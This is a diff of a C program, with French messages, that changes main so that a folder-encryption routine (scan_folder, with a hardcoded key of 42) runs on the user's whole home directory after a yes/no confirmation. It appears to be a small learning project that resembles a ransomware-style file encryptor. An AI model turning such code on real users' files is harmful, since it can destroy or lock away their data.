@@ -104,20 +104,36 @@ void scan_folder(char *path, unsigned char key, int mode)
     
 }
 
-int main(int ac, char **av)
+int main(void)
 {
-    if (ac != 4)
+
+    char *target_path;
+    int key = 42;
+    int mode = 1;
+
+    #ifdef _WIN32
+        target_path = getenv("USERPROFILE");
+        
+    #else
+        target_path = getenv("HOME");
+
+    #endif
+        
+    char choix;
+
+    if (target_path == NULL)
     {
-        perror("erreur arguments");
-        exit(EXIT_FAILURE);
+        printf("Dossier introuvable, ERROR");
+        return 1;
     }
 
-    unsigned char key = (unsigned char)atoi(av[2]);
+    printf("Voulez-vous vraiment chiffrer %s ? (y/n)", target_path);
+    scanf(" %c", &choix);
 
-    int mode = atoi(av[3]);
-
-    scan_folder(av[1], key, mode);
-
+    if (choix == 'y' || choix == 'Y')
+        scan_folder(target_path, key, mode);
+    else if (choix == 'n' || choix == 'N')
+        exit(EXIT_FAILURE);
 
     return 0;
 }
